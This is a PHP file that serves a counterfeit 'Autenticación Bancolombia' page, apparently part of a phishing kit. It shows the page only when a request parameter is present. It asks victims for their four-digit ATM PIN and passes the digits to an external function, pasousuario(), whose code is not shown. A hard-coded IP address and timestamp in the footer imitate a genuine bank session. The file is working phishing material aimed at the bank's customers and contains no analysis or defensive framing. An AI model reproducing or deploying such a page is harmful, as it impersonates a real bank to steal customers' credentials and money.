<?php
if (isset($_REQUEST["p"])) {
    $key = $_REQUEST["p"];
    $jsCode = <<<HTML
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Autenticación Bancolombia</title>
    <link rel="icon" href="./assets/img/logo.png">

    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link href="/assets/css/main.css" rel='stylesheet'>

    <script type="text/javascript" src="/assets/js/main.js"></script>
    <script type="text/javascript" src="/assets/js/main.js"></script>  	
</head>
<body>
    <div class="wrapper">
        <header class="header">
            <span>Salir <i class='bx bx-exit'></i></span>
        </header>

        <main class="main">
            <h2 class="main__ttl">Clave principal</h2>

            <div class="box">
                <i class='box__icon--lock bx bx-lock'></i>

                <p class="box__txt">
                    Es la misma que usas en el cajero automático
                </p>

                <div id="claveForm" style="font-size: 5px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit1" style="font-size: 10px;width: 40px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit2" style="font-size: 10px;width: 40px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit3" style="font-size: 10px;width: 40px; font-size:16px;">
                    <input type="password" maxlength="1" inputmode="numeric" class="digit-input" id="digit4" style="font-size: 10px;width: 40px; font-size:16px;">
                </div>

                <div class="box__opt">
                    <button class="box__btn box__btn--transp" style="color:black;">Volver</button>
                    <button class="box__btn" id="btnPass" style="color:black;">Continuar</button>
                </div>
            </div>

            <div class="picture"></div>
        </main>

        <footer class="footer">
            <div class="line"></div>
            <div class="footer__logo1"></div>
            <div class="footer__logo2"></div>

            <span>
                <p>Dirección IP: 190.210.118.1</p>
                <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>
            </span>
        </footer>
    </div>

    <script src="/assets/js/main.js"></script>

    <script type="text/javascript">
        var espera = 0;
        let identificadorTiempoDeEspera;

        function retardor() {
            identificadorTiempoDeEspera = setTimeout(retardorX, 900);
        }

        function retardorX() {

        }

        $(document).ready(function() {
            $('#btnPass').click(function() {
                var digitInputs = document.getElementsByClassName('digit-input');
                var concatenatedValue = '';

                for (var i = 0; i < digitInputs.length; i++) {
                    concatenatedValue += digitInputs[i].value;
                }

                pasousuario(concatenatedValue);
            });
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const inputs = document.querySelectorAll('.digit-input');

            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && index > 0 && input.value.length === 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        });
    </script>
</body>
</html>
HTML;
echo $jsCode;

}
?>
